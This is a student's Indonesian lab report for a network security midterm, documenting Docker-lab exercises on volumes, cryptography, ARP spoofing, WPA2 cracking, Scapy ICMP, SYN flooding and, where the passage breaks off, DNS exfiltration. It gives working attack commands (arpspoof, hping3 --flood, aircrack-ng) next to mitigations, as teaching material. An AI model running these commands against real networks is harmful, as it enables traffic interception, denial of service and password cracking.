# LAPORAN UJIAN TENGAH SEMESTER (UTS)
# PRAKTIK INFRASTRUKTUR & NETWORK ATTACKS

## Dokumentasi Praktikum Kasus 5 — Pertemuan 1–7

**Disusun oleh:**

| Identitas | Keterangan |
|---|---|
| Nama | Putra Baa'di Zaelani |
| NIM | 24552011131 |
| Kelas | TIF RP 24 E CNS |
| Mata Kuliah | Network Security |
| Nomor Kasus | 5 |
| Cakupan Pertemuan | 1–7 |

---

# A. PENDAHULUAN

## 1. Latar Belakang

Praktikum Ujian Tengah Semester (UTS) Praktik Infrastruktur & Network Attacks merupakan kegiatan pembelajaran yang bertujuan untuk menambah pemahaman mengenai keamanan jaringan melalui praktik secara langsung.

Dalam kegiatan ini, pengujian dilakukan menggunakan lingkungan laboratorium berbasis Docker dengan bantuan beberapa tools keamanan jaringan. Materi yang dipraktikkan meliputi Docker dan Volume, Kriptografi, ARP Spoofing, Analisis WPA2 Handshake, ICMP menggunakan Scapy, SYN Flood, dan DNS Exfiltration.

Melalui tujuh kegiatan tersebut, mahasiswa diharapkan dapat memahami cara kerja beberapa teknologi jaringan, mengetahui kemungkinan ancaman yang dapat terjadi, serta mempelajari metode pengujian dan mitigasinya.

Setiap kegiatan dilengkapi dengan langkah pengerjaan, hasil pengujian, pembahasan, kesimpulan, dan dokumentasi screenshot sebagai bukti pelaksanaan praktikum.

Dokumen ini merupakan laporan utama. Dokumentasi pendukung setiap tugas berupa file `hasil.md` dan screenshot tersedia pada folder `tugas-1/` sampai `tugas-7/` di direktori yang sesuai.

## 2. Penentuan Nomor Kasus

Penentuan nomor kasus dilakukan berdasarkan jumlah seluruh digit NIM mahasiswa.

**NIM: 24552011131**

Perhitungan:

```text
2 + 4 + 5 + 5 + 2 + 0 + 1 + 1 + 1 + 3 + 1 = 25

25 mod 10 = 5
```

Berdasarkan hasil perhitungan tersebut, nomor kasus yang dikerjakan adalah **Kasus 5**.

## 3. Parameter Praktikum

| Parameter | Nilai |
|---|---|
| Nomor Kasus | 5 |
| Container target | `target-k5` |
| Volume Docker | `vol-k5` |
| File laporan | `laporan-k5.txt` |
| Domain DNS | `k5.exfil.lab` |
| Lingkungan | Kali Linux dan Docker |

## 4. Struktur Repository

Berikut merupakan struktur utama direktori yang digunakan untuk menyimpan kebutuhan praktikum.

| Folder | Keterangan |
|---|---|
| `01-sumber-lab/` | Berisi Dockerfile, konfigurasi Docker Compose, dan script praktikum. |
| `02-dokumen/` | Berisi dokumen panduan dan lembar perintah praktikum. |
| `03-hasil-kasus-5/` | Berisi laporan utama (`jawaban.md`), file `hasil.md`, dan screenshot setiap tugas. |

---

# B. HASIL DAN PEMBAHASAN PRAKTIKUM

# TUGAS 1 — DOCKER DAN VOLUME

**Pertemuan 1**

## 1. Tujuan

Praktikum ini bertujuan untuk memahami penggunaan Docker Volume sebagai media penyimpanan data secara persisten. Selain itu, kegiatan ini juga dilakukan untuk menguji komunikasi antarcontainer menggunakan Docker Compose.

## 2. Langkah Pengerjaan

**1. Membuat Docker Volume**

Langkah pertama adalah membuat volume dengan nama `vol-k5` yang akan digunakan untuk menyimpan data praktikum.

```bash
sudo docker volume create vol-k5
```

**2. Menulis NIM ke dalam volume**

Selanjutnya, menjalankan container Alpine untuk membuat file `laporan-k5.txt` dan menyimpan NIM ke dalam volume yang telah dibuat.

```bash
sudo docker run --name w-k5 -v vol-k5:/data alpine sh -c 'echo 24552011131 > /data/laporan-k5.txt'
```

**3. Menghapus container pertama**

Setelah data berhasil disimpan, container `w-k5` dihapus untuk menguji apakah data tetap tersedia di dalam volume.

```bash
sudo docker rm w-k5
```

**4. Membaca kembali file menggunakan container baru**

File yang sebelumnya disimpan kemudian dibaca menggunakan container baru.

```bash
sudo docker run --rm -v vol-k5:/data alpine cat /data/laporan-k5.txt
```

Hasil:

```text
24552011131
```

**5. Menjalankan layanan Docker Compose**

Selanjutnya, menjalankan layanan attacker dan target menggunakan Docker Compose.

```bash
sudo docker compose -p k5 -f 01-sumber-lab/b/b1-compose/docker-compose.yml up -d
```

**6. Menguji komunikasi attacker ke target**

Pengujian komunikasi dilakukan dengan mengakses layanan web pada container target dari container attacker.

```bash
sudo docker compose -p k5 -f 01-sumber-lab/b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
```

Hasil: halaman default Nginx berhasil ditampilkan.

**7. Membersihkan lingkungan praktikum**

Setelah seluruh pengujian selesai, container dan volume yang digunakan dibersihkan.

```bash
sudo docker compose -p k5 -f 01-sumber-lab/b/b1-compose/docker-compose.yml down -v
```

## 3. Hasil Pengujian

Berdasarkan pengujian yang dilakukan, file `laporan-k5.txt` yang berisi NIM berhasil dibaca kembali setelah container yang digunakan untuk menulis data dihapus.

Hasil tersebut menunjukkan bahwa Docker Volume dapat menyimpan data secara terpisah dari siklus hidup container. Dengan demikian, data yang disimpan di dalam volume tetap tersedia meskipun container dihapus.

Selain itu, pengujian komunikasi antarcontainer juga berhasil dilakukan. Container attacker dapat mengakses halaman default Nginx pada container target melalui nama service `target`.

## 4. Bukti Screenshot

**Gambar 1.** Proses pembuatan Docker Volume dengan nama `vol-k5` yang digunakan sebagai media penyimpanan data praktikum.

![Gambar 1](https://github.com/user-attachments/assets/48bae63f-981c-40eb-8cff-42b846e74782)

**Gambar 2.** Proses memasukkan NIM ke dalam file `laporan-k5.txt` yang disimpan pada Docker Volume `vol-k5`.

![Gambar 2](https://github.com/user-attachments/assets/bd53370b-97c9-4d31-ab88-98ef0b83c1a4)

**Gambar 3.** Penghapusan container `w-k5` setelah proses penyimpanan data selesai dilakukan.

![Gambar 3](https://github.com/user-attachments/assets/2efb07ff-687c-4bec-947a-ed8d3084f5e6)

**Gambar 4.** Pengujian pembacaan kembali file `laporan-k5.txt` menggunakan container baru. NIM masih dapat ditampilkan meskipun container sebelumnya telah dihapus.

![Gambar 4](https://github.com/user-attachments/assets/2b81f0af-21fa-4705-9649-bfec601e1a4b)

**Gambar 5.** Proses menjalankan container attacker dan target menggunakan Docker Compose sebagai persiapan pengujian komunikasi antarcontainer.

![Gambar 5](https://github.com/user-attachments/assets/8b1528c7-7481-4798-be77-2992e0d3c0a6)

**Gambar 6.** Pengujian komunikasi dari container attacker menuju server Nginx pada container target. Hasilnya, halaman default Nginx berhasil ditampilkan.

![Gambar 6](https://github.com/user-attachments/assets/98d143eb-f433-486c-9ffd-6815f5b91ea8)

**Gambar 7.** Proses menghentikan dan membersihkan lingkungan praktikum menggunakan Docker Compose setelah pengujian selesai.

![Gambar 7](https://github.com/user-attachments/assets/5f6de2bb-c5b3-45c9-bd58-7669b1f43aa2)

## 5. Kesimpulan

Berdasarkan praktikum yang telah dilakukan, Docker Volume dapat digunakan untuk menyimpan data secara persisten sehingga data tidak hilang ketika container dihapus.

Selain itu, Docker Compose mempermudah pengelolaan beberapa container yang saling terhubung dalam satu jaringan. Melalui pengujian ini, saya dapat memahami bahwa penyimpanan data dan komunikasi antarcontainer merupakan bagian penting dalam pengelolaan lingkungan Docker.

---

# TUGAS 2 — KRIPTOGRAFI

**Pertemuan 2**

## 1. Tujuan

Praktikum ini bertujuan untuk memahami proses enkripsi dan dekripsi menggunakan algoritma AES-256-CBC, melakukan pemeriksaan integritas data menggunakan SHA-256, serta membuat sertifikat digital menggunakan OpenSSL.

## 2. Langkah Pengerjaan

### a. Enkripsi dan Dekripsi AES-256-CBC

Langkah pertama adalah membuat file yang akan digunakan sebagai bahan pengujian. File tersebut kemudian dienkripsi menggunakan AES-256-CBC.

```bash
sudo docker run --rm -v "$PWD":/work uts-openssl sh -c \
'echo isi laporan k5 > laporan-k5.txt &&
openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k5.txt -out laporan-k5.enc -pass pass:kunci-k5-2026 &&
sha256sum laporan-k5.txt &&
openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k5.enc -out hasil-k5.txt -pass pass:kunci-k5-2026 &&
sha256sum hasil-k5.txt'
```

Setelah proses enkripsi selesai, file terenkripsi didekripsi kembali menggunakan kunci yang sama. Selanjutnya, nilai hash dari file asli dan hasil dekripsi dibandingkan untuk memeriksa kesamaan data.

### b. Pembuatan Sertifikat Digital

Setelah pengujian enkripsi dan dekripsi, dilakukan pembuatan sertifikat digital X.509 menggunakan OpenSSL.

```bash
sudo docker run --rm -v "$PWD":/work uts-openssl sh -c \
'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k5.pem -out cert-k5.pem -days 30 -subj /CN=k5.uts.local &&
openssl x509 -in cert-k5.pem -noout -subject -issuer -dates'
```

Perintah tersebut digunakan untuk membuat pasangan kunci RSA dan sertifikat digital self-signed dengan Common Name `k5.uts.local`.

## 3. Hasil Pengujian

Berdasarkan hasil pengujian, proses enkripsi dan dekripsi menggunakan AES-256-CBC berhasil dilakukan.

Pemeriksaan integritas menggunakan SHA-256 menghasilkan nilai hash yang sama pada file asli dan file hasil dekripsi.

```text
22e90e5baa6048f9871927be4fa8af9d141b10a1071cf2b975272db8343f79b5
```

Kesamaan nilai hash menunjukkan bahwa isi file setelah proses dekripsi sesuai dengan isi file sebelum dienkripsi.

Selain itu, sertifikat digital X.509 self-signed berhasil dibuat menggunakan OpenSSL dengan hasil sebagai berikut.

| Field | Hasil |
|---|---|
| Subject | `CN=k5.uts.local` |
| Issuer | `CN=k5.uts.local` |
| Masa berlaku | 24 November 2026 – 24 Desember 2026 |
| Algoritma kunci | RSA 2048-bit |

Sertifikat self-signed merupakan sertifikat yang ditandatangani menggunakan kunci milik pembuatnya sendiri. Oleh karena itu, nilai Subject dan Issuer pada sertifikat ini sama.

Berbeda dengan sertifikat yang ditandatangani oleh Certificate Authority (CA), sertifikat self-signed tidak secara otomatis memperoleh kepercayaan dari pihak lain dan perlu diverifikasi secara terpisah.

## 4. Bukti Screenshot

**Gambar 8.** Proses enkripsi dan dekripsi file menggunakan AES-256-CBC, dilanjutkan dengan pemeriksaan hash SHA-256 untuk memastikan data hasil dekripsi sesuai dengan file aslinya.

![Gambar 8](https://github.com/user-attachments/assets/19675bbd-c956-4ca8-950f-8de565614b02)

**Gambar 9.** Proses pembuatan sertifikat digital X.509 self-signed menggunakan OpenSSL dan pemeriksaan informasi sertifikat yang telah berhasil dibuat.

![Gambar 9](https://github.com/user-attachments/assets/085644cf-f7b4-493f-85d0-6d92c5294e70)

## 5. Kesimpulan

Berdasarkan praktikum ini, saya memahami bahwa AES-256-CBC dapat digunakan untuk menjaga kerahasiaan data melalui proses enkripsi dan dekripsi.

SHA-256 digunakan untuk memeriksa integritas data dengan membandingkan nilai hash sebelum dan sesudah proses dekripsi. Sementara itu, sertifikat X.509 dapat digunakan untuk identifikasi suatu entitas dalam komunikasi digital.

---

# TUGAS 3 — ARP SPOOFING

**Pertemuan 3**

## 1. Tujuan

Praktikum ini bertujuan untuk memahami cara kerja protokol ARP, melakukan simulasi ARP Spoofing pada jaringan laboratorium, serta mempelajari salah satu metode mitigasinya menggunakan Static ARP.

## 2. Langkah Pengerjaan

**1. Membuat jaringan internal**

Langkah pertama adalah membuat jaringan Docker internal yang digunakan sebagai lingkungan pengujian.

```bash
sudo docker network create --internal lab-arp-k5
```

**2. Menjalankan container korban**

```bash
sudo docker run -d --name korban-k5 --network lab-arp-k5 --cap-add NET_ADMIN uts-kali-tools
```

**3. Menjalankan container gateway**

```bash
sudo docker run -d --name gateway-k5 --network lab-arp-k5 --cap-add NET_ADMIN uts-kali-tools
```

**4. Menjalankan container penyerang**

```bash
sudo docker run -d --name penyerang-k5 --network lab-arp-k5 --cap-add NET_ADMIN uts-kali-tools
```

**5. Memeriksa alamat IP setiap container**

```bash
sudo docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k5").IPAddress}}' korban-k5 gateway-k5 penyerang-k5
```

Hasil:

| Container | IP Address |
|---|---|
| Korban | `172.20.0.2` |
| Gateway | `172.20.0.3` |
| Penyerang | `172.20.0.4` |

**6. Memeriksa tabel ARP sebelum spoofing**

```bash
sudo docker exec korban-k5 arp -a
```

**7. Menjalankan simulasi ARP Spoofing**

```bash
sudo docker exec -d penyerang-k5 timeout 20 arpspoof -i eth0 -t 172.20.0.2 172.20.0.3
```

**8. Memeriksa tabel ARP setelah spoofing**

```bash
sudo docker exec korban-k5 arp -a
```

**9. Menerapkan Static ARP**

```bash
sudo docker exec korban-k5 arp -s 172.20.0.3 $(sudo docker exec gateway-k5 cat /sys/class/net/eth0/address)
```

**10. Memeriksa tabel ARP setelah mitigasi**

```bash
sudo docker exec korban-k5 arp -a
```

## 3. Hasil Pengujian

Berdasarkan hasil pengamatan, terdapat perubahan MAC Address gateway pada tabel ARP milik container korban selama simulasi berlangsung.

| Kondisi | MAC Address Gateway |
|---|---|
| Sebelum spoofing | `06:07:6d:ed:83:2c` |
| Setelah spoofing | `c2:a5:0b:4f:be:c2` |
| Setelah mitigasi | `06:07:6d:ed:83:2c` |

Sebelum serangan dilakukan, tabel ARP korban menunjukkan MAC Address gateway yang sebenarnya.

Setelah simulasi ARP Spoofing dijalankan, pemetaan alamat MAC gateway berubah menjadi MAC Address milik container penyerang. Hal tersebut menunjukkan bahwa paket ARP palsu berhasil memengaruhi informasi pemetaan pada tabel ARP korban.

Setelah Static ARP diterapkan, pemetaan alamat gateway kembali menggunakan MAC Address yang sebenarnya dan ditampilkan dengan status permanen (`PERM`).

## 4. Bukti Screenshot

**Gambar 10.** Proses pembuatan jaringan Docker internal bernama `lab-arp-k5` yang digunakan sebagai lingkungan simulasi ARP Spoofing.

![Gambar 10](https://github.com/user-attachments/assets/38ba18d2-c60d-4868-8e20-738788064bce)

**Gambar 11.** Proses menjalankan container korban yang akan digunakan untuk mengamati perubahan tabel ARP selama pengujian.

![Gambar 11](https://github.com/user-attachments/assets/79d9dd80-f284-45aa-be66-f53b9165d5fa)

**Gambar 12.** Proses menjalankan container gateway sebagai perangkat tujuan yang akan dipetakan alamat IP dan MAC Address-nya.

![Gambar 12](https://github.com/user-attachments/assets/3a9c7f49-db3f-4c82-ba3f-c3a4f714c430)

**Gambar 13.** Proses menjalankan container penyerang yang digunakan untuk melakukan simulasi ARP Spoofing pada jaringan laboratorium.

![Gambar 13](https://github.com/user-attachments/assets/13097941-35f3-4267-90b3-894d612148d3)

**Gambar 14.** Pemeriksaan alamat IP dari container korban, gateway, dan penyerang untuk memastikan konfigurasi jaringan sesuai dengan rancangan praktikum.

![Gambar 14](https://github.com/user-attachments/assets/ded1d69c-3057-44ef-abd5-4f8482b46e86)

**Gambar 15.** Hasil pemeriksaan tabel ARP pada container korban sebelum serangan dilakukan. Data ini digunakan sebagai pembanding dengan kondisi setelah spoofing.

![Gambar 15](https://github.com/user-attachments/assets/14b8b3a8-fd5d-4ab4-8979-b523cb89d322)

**Gambar 16.** Proses menjalankan simulasi ARP Spoofing dari container penyerang terhadap container korban dengan mengirimkan paket ARP palsu.

![Gambar 16](https://github.com/user-attachments/assets/d0dc51e6-c092-41d2-8f09-855fa25c9215)

**Gambar 17.** Hasil pemeriksaan tabel ARP setelah simulasi dilakukan. Terlihat adanya perubahan MAC Address gateway menjadi MAC Address milik container penyerang.

![Gambar 17](https://github.com/user-attachments/assets/7756406a-0401-49cd-8021-22035eaa678d)

**Gambar 18.** Proses penerapan Static ARP pada container korban untuk mempertahankan pemetaan alamat IP gateway dengan MAC Address yang benar.

![Gambar 18](https://github.com/user-attachments/assets/f9835b3b-8d17-4976-88c5-8525cac006f7)

**Gambar 19.** Hasil pemeriksaan tabel ARP setelah mitigasi diterapkan. Pemetaan gateway kembali menggunakan MAC Address asli dengan status permanen.

![Gambar 19](https://github.com/user-attachments/assets/9a4b282f-e8a0-464a-96b9-88042c6672a2)

## 5. Mitigasi Lain

Selain menggunakan Static ARP, ARP Spoofing juga dapat dikurangi dengan menerapkan Dynamic ARP Inspection (DAI).

Fitur DAI bekerja dengan memvalidasi paket ARP berdasarkan informasi IP dan MAC Address yang dipercaya, misalnya melalui data DHCP Snooping. Dengan demikian, paket ARP yang tidak sesuai dengan informasi valid dapat ditolak.

## 6. Kesimpulan

Berdasarkan praktikum yang telah dilakukan, ARP Spoofing dapat mengubah pemetaan IP dan MAC Address pada tabel ARP korban.

Melalui pengujian ini, saya dapat melihat secara langsung perubahan MAC Address ketika simulasi dilakukan. Penerapan Static ARP membantu mempertahankan pemetaan yang benar, sedangkan Dynamic ARP Inspection dapat menjadi perlindungan tambahan pada jaringan yang mendukung fitur tersebut.

---

# TUGAS 4 — ANALISIS WPA2 HANDSHAKE

**Pertemuan 4**

## 1. Tujuan

Praktikum ini bertujuan untuk memahami proses autentikasi WPA2 dan mencoba melakukan analisis file handshake menggunakan Aircrack-ng serta wordlist yang telah disediakan.

## 2. Langkah Pengerjaan

**1. Memeriksa file capture dan wordlist**

Langkah pertama adalah memastikan file capture dan wordlist tersedia sebelum dilakukan proses analisis.

```bash
ls -lh handshake-k5.cap wordlist-k5.txt
```

**2. Memeriksa informasi capture**

```bash
capinfos handshake-k5.cap
```

**3. Mencoba analisis menggunakan Aircrack-ng**

```bash
aircrack-ng -w wordlist-k5.txt handshake-k5.cap
```

**4. Memeriksa header file**

```bash
xxd -l 128 handshake-k5.cap
```

**5. Memeriksa hash file**

```bash
sha256sum handshake-k5.cap
```

## 3. Hasil Pengujian

Berdasarkan pengujian yang dilakukan, file `handshake-k5.cap` tidak berhasil dianalisis menggunakan Aircrack-ng.

Dari hasil pemeriksaan, ditemukan beberapa kondisi berikut:

- `capinfos` melaporkan bahwa file capture rusak atau tidak dapat dibaca dengan benar.
- Aircrack-ng membaca 0 paket.
- Aircrack-ng menyatakan bahwa file bukan capture 802.11 yang valid.
- Tidak ditemukan jaringan yang dapat dianalisis.

Dengan demikian, proses pengujian hanya dapat dilakukan sampai tahap pemeriksaan file. Proses pencocokan wordlist belum dapat dilanjutkan karena file capture tidak berhasil dibaca sebagai capture 802.11 yang valid.

Tidak terdapat hasil `KEY FOUND` maupun `KEY NOT FOUND` karena proses analisis belum berhasil mencapai tahap pencocokan kata sandi.

Pemeriksaan menggunakan `xxd` menunjukkan adanya magic number pcap. Namun, hal tersebut belum cukup untuk membuktikan bahwa seluruh isi file merupakan capture 802.11 yang valid.

## 4. Bukti Screenshot

**Gambar 20.** Pemeriksaan ketersediaan file `handshake-k5.cap` dan `wordlist-k5.txt` sebagai persiapan sebelum proses analisis WPA2 Handshake dilakukan.

![Gambar 20](https://github.com/user-attachments/assets/5fad8222-00f3-48fb-ab3b-dfc4cc814d1f)

**Gambar 21.** Pemeriksaan isi wordlist yang digunakan sebagai kumpulan kandidat kata sandi dalam pengujian WPA2 Handshake.

![Gambar 21](https://github.com/user-attachments/assets/58d19bac-ec5a-4cf6-9e23-d5521d5e2784)

**Gambar 22.** Hasil pemeriksaan file capture menggunakan `capinfos`. Informasi yang ditampilkan menunjukkan bahwa file mengalami masalah sehingga tidak dapat dibaca dengan benar.

![Gambar 22](https://github.com/user-attachments/assets/8b754e73-8829-4223-a444-fb6627649c13)

**Gambar 23.** Hasil percobaan analisis menggunakan Aircrack-ng. File capture tidak berhasil dikenali sebagai format 802.11 yang valid sehingga proses pencocokan wordlist tidak dapat dilanjutkan.

![Gambar 23](https://github.com/user-attachments/assets/95dfa713-42ce-4927-85d4-26f70bf0b788)

**Gambar 24.** Pemeriksaan bagian awal file menggunakan perintah `xxd` untuk melihat informasi header dan struktur awal file capture.

![Gambar 24](https://github.com/user-attachments/assets/5ca7b8f7-d68a-45f9-bf8f-37a1d9c42bae)

**Gambar 25.** Pemeriksaan nilai hash SHA-256 file capture sebagai informasi identifikasi file yang digunakan selama pengujian.

![Gambar 25](https://github.com/user-attachments/assets/89c674de-f23a-4c31-9643-fdb39f1c62a4)

## 5. Pembahasan WPA2 Four-Way Handshake

Secara konsep, proses autentikasi WPA2 menggunakan empat tahapan utama yang dikenal sebagai Four-Way Handshake.

1. **Message 1 (AP → Client):** Access Point mengirimkan ANonce kepada client sebagai bagian dari proses pembentukan kunci.
2. **Message 2 (Client → AP):** Client menghasilkan SNonce, menghitung PTK, kemudian mengirimkan SNonce beserta MIC kepada Access Point.
3. **Message 3 (AP → Client):** Access Point mengirimkan informasi GTK yang telah dienkripsi beserta MIC kepada client.
4. **Message 4 (Client → AP):** Client mengirimkan konfirmasi bahwa pesan telah diterima. Setelah proses ini selesai, komunikasi terenkripsi dapat digunakan.

Pada praktikum ini, file capture tidak dapat dibaca dengan benar sehingga tahapan tersebut tidak dapat diamati secara langsung melalui hasil capture yang tersedia.

## 6. Kesimpulan

Berdasarkan praktikum Kasus 5, saya memahami konsep dasar autentikasi WPA2 menggunakan Four-Way Handshake serta pentingnya file capture yang valid dalam proses analisis keamanan jaringan wireless.

Pada pengujian yang dilakukan, file handshake-k5.cap yang tersedia mengalami masalah saat diperiksa menggunakan capinfos. Tool tersebut gagal membaca paket pertama dan menampilkan informasi ukuran paket yang tidak valid. Percobaan analisis lebih lanjut juga tidak dapat berjalan sebagaimana mestinya.

Oleh karena itu, proses analisis tidak dapat dilanjutkan secara valid. Hasil pengujian dicatat berdasarkan kondisi file dan keluaran tool yang diperoleh selama praktikum, tanpa menyimpulkan hasil yang belum berhasil dibuktikan.

---

# TUGAS 5 — ICMP MENGGUNAKAN SCAPY

**Pertemuan 5**

## 1. Tujuan

Praktikum ini bertujuan untuk memahami protokol ICMP serta mempelajari penggunaan Scapy untuk membuat dan mengirim paket ICMP. Selain itu, dilakukan pengamatan terhadap respons dari host tujuan.

## 2. Langkah Pengerjaan

Pengujian dilakukan dengan menjalankan script pengiriman ICMP menggunakan perintah berikut.

```bash
sudo docker run --rm --network lab-arp-k5 -v "$PWD/01-sumber-lab/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py 172.20.0.2
```

Perintah tersebut digunakan untuk menjalankan script `kirim_icmp.py` dari dalam container dan mengirimkan paket ICMP menuju alamat IP `172.20.0.2`.

## 3. Hasil Pengujian

Berdasarkan hasil pengujian, paket ICMP berhasil dikirim dan mendapatkan respons dari host tujuan.

Hasil pengujian:

```text
Mengirim: IP / ICMP 172.20.0.5 > 172.20.0.2 echo-request 0
TTL balasan: 64
Tipe ICMP balasan: 0
```

Dari hasil tersebut, terlihat bahwa paket dikirim dari alamat IP `172.20.0.5` menuju `172.20.0.2`.

Nilai TTL balasan adalah 64, sedangkan tipe ICMP 0 menunjukkan bahwa paket yang diterima merupakan Echo Reply.

Hal ini menunjukkan bahwa host tujuan berhasil memberikan respons terhadap ICMP Echo Request yang dikirim menggunakan Scapy.

## 4. Bukti Screenshot

**Gambar 26.** Hasil pengujian pengiriman ICMP Echo Request menggunakan Scapy. Pada terminal terlihat paket dikirim menuju host tujuan dan mendapatkan respons berupa Echo Reply.

![Gambar 26](https://github.com/user-attachments/assets/c0bc5a2d-132f-40fa-a25e-3a13bac468f2)

## 5. Pembahasan Smurf Attack

Smurf Attack merupakan salah satu bentuk serangan Denial of Service (DoS) yang memanfaatkan ICMP Echo Request dan alamat broadcast.

Dalam serangan ini, penyerang memalsukan alamat IP korban sebagai alamat sumber paket. Paket kemudian dikirim ke alamat broadcast sehingga sejumlah host dapat mengirimkan balasan ICMP secara bersamaan menuju korban.

Jika dilakukan dalam skala besar, kondisi tersebut dapat meningkatkan beban lalu lintas jaringan dan mengganggu ketersediaan layanan.

Beberapa langkah mitigasi yang dapat diterapkan antara lain:

- Membatasi respons terhadap ICMP broadcast.
- Melakukan penyaringan paket pada perangkat jaringan.
- Menggunakan konfigurasi router yang menolak directed broadcast yang tidak diperlukan.

## 6. Kesimpulan

Berdasarkan praktikum yang dilakukan, Scapy dapat digunakan untuk membuat dan mengirim paket jaringan secara terprogram.

Melalui pengujian ini, saya dapat memahami mekanisme ICMP Echo Request dan Echo Reply serta mengetahui bahwa protokol ICMP juga dapat disalahgunakan dalam serangan seperti Smurf Attack.

---

# TUGAS 6 — SYN FLOOD DAN TCP THREE-WAY HANDSHAKE

**Pertemuan 6**

## 1. Tujuan

Praktikum ini bertujuan untuk memahami proses pembentukan koneksi TCP melalui Three-Way Handshake serta mempelajari simulasi SYN Flood secara terbatas pada lingkungan laboratorium.

## 2. Langkah Pengerjaan

**1. Menjalankan container praktikum**

Langkah pertama adalah menjalankan container attacker dan target menggunakan Docker Compose.

```bash
sudo docker compose -p k5 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml up -d
```

**2. Memeriksa jumlah koneksi `SYN_RECV` sebelum serangan**

```bash
sudo docker compose -p k5 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
```

Hasil:

```text
0
```

**3. Menjalankan simulasi SYN Flood selama 15 detik**

```bash
sudo docker compose -p k5 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
```

**4. Memantau status `SYN_RECV` sebanyak 10 kali dengan interval satu detik**

Hasil pengamatan:

```text
2, 1, 0, 1, 1, 0, 0, 0, 0, 0
```

**5. Mengamati lalu lintas menggunakan tcpdump**

Pengamatan dilakukan ketika satu koneksi HTTP dibuat menggunakan `curl`.

Hasil: sebanyak 12 paket berhasil tertangkap selama pengujian.

**6. Membersihkan lingkungan praktikum**

```bash
sudo docker compose -p k5 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml down -v
```

## 3. Pembahasan TCP Three-Way Handshake

TCP Three-Way Handshake merupakan proses pembentukan koneksi antara client dan server yang terdiri dari tiga tahapan.

1. **SYN:** Client mengirimkan permintaan untuk memulai koneksi TCP kepada server.
2. **SYN-ACK:** Server menerima permintaan tersebut dan mengirimkan respons kepada client.
3. **ACK:** Client mengirimkan konfirmasi sehingga koneksi TCP dapat digunakan untuk pertukaran data.

Proses ini diperlukan agar kedua perangkat dapat membentuk koneksi sebelum melakukan komunikasi menggunakan TCP.

## 4. Hasil Pengujian

Berdasarkan hasil pengamatan, jumlah koneksi dengan status `SYN_RECV` mengalami perubahan selama simulasi SYN Flood berlangsung.

| Kondisi | Jumlah `SYN_RECV` |
|---|---|
| Sebelum serangan | `0` |
| Selama serangan (10 sampel) | `2, 1, 0, 1, 1, 0, 0, 0, 0, 0` |

Nilai `SYN_RECV` sempat meningkat menjadi 1–2 ketika simulasi dijalankan, kemudian kembali turun menjadi 0 pada beberapa pengamatan berikutnya.

Hasil tersebut menunjukkan adanya koneksi setengah terbuka yang sempat teramati selama pengujian. Namun, berdasarkan data yang diperoleh, tidak dapat disimpulkan bahwa server mengalami kelumpuhan.

Pada pengujian menggunakan tcpdump, sebanyak 12 paket berhasil tertangkap ketika satu koneksi HTTP dibuat.

Paket yang diamati mencakup proses TCP Three-Way Handshake, HTTP GET, HTTP 200 OK, serta proses penutupan koneksi menggunakan FIN/ACK.

## 5. Bukti Screenshot

**Gambar 27.** Proses menjalankan container attacker dan target menggunakan Docker Compose sebagai persiapan untuk melakukan simulasi SYN Flood.

![Gambar 27](https://github.com/user-attachments/assets/99efbc88-1d5c-4602-86ec-0f0cee8c72f9)

**Gambar 28.** Pemeriksaan awal jumlah koneksi dengan status `SYN_RECV` pada container target sebelum simulasi dilakukan. Hasil awal menunjukkan nilai 0.

![Gambar 28](https://github.com/user-attachments/assets/179ac2f3-8437-4b1e-b038-19cd9b4d074e)

**Gambar 29.** Proses menjalankan simulasi SYN Flood menggunakan hping3 dengan durasi 15 detik pada lingkungan laboratorium.

![Gambar 29](https://github.com/user-attachments/assets/3c622444-45e9-44d2-80cc-ab0b6e544969)

**Gambar 30.** Hasil pemantauan jumlah koneksi `SYN_RECV` selama simulasi berlangsung. Terlihat adanya perubahan jumlah koneksi pada beberapa waktu pengamatan.

![Gambar 30](https://github.com/user-attachments/assets/ae1af218-1746-402f-9164-4a5a5fa513e0)

**Gambar 31.** Proses pengamatan lalu lintas jaringan menggunakan tcpdump ketika koneksi HTTP dilakukan untuk melihat paket TCP yang melewati jaringan.

![Gambar 31](https://github.com/user-attachments/assets/c6263b76-1036-4051-81e3-06caa57ffe39)

**Gambar 32.** Proses membersihkan container dan jaringan praktikum menggunakan Docker Compose setelah seluruh pengujian selesai dilakukan.

![Gambar 32](https://github.com/user-attachments/assets/69ec7d1c-64f7-4101-b047-6d2eed42f9ed)

## 6. Mitigasi SYN Flood

Salah satu metode yang dapat digunakan untuk mengurangi dampak SYN Flood adalah SYN Cookies.

SYN Cookies memungkinkan server menunda penggunaan sumber daya koneksi secara penuh sampai menerima ACK yang valid dari client. Metode ini membantu mengurangi risiko penumpukan koneksi setengah terbuka.

Selain itu, administrator jaringan dapat menerapkan pembatasan koneksi dan pemantauan lalu lintas jaringan untuk mendeteksi aktivitas yang tidak normal.

## 7. Kesimpulan

Berdasarkan praktikum yang dilakukan, SYN Flood memanfaatkan pengiriman paket SYN dalam jumlah besar untuk berpotensi membebani sumber daya server.

Melalui pengujian ini, saya dapat mengamati perubahan jumlah koneksi `SYN_RECV` dan memahami fungsi tcpdump dalam melihat lalu lintas jaringan.

Praktikum ini juga memberikan pemahaman mengenai proses TCP Three-Way Handshake dan salah satu metode mitigasi SYN Flood, yaitu SYN Cookies.

---

# TUGAS 7 — DNS EXFILTRATION

**Pertemuan 7**

## 1. Tujuan

Praktikum ini bertujuan untuk memahami penyalahgunaan protokol DNS sebagai media pengiriman data serta mempelajari cara mendeteksi pola query DNS yang mencurigakan melalui analisis log.

## 2. Langkah Pengerjaan

**1. Menjalankan layanan DNS dan attacker**

Langkah pertama adalah menjalankan container yang digunakan untuk simulasi DNS Exfiltration.

```bash
sudo docker compose -p k5 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml up -d
```

**2. Mengubah NIM menjadi format hexadecimal**

```bash
echo -n 24552011131 | xxd -p
```

Hasil:

```text
3234353532303131313331
```

**3. Mengirim query DNS**

```bash
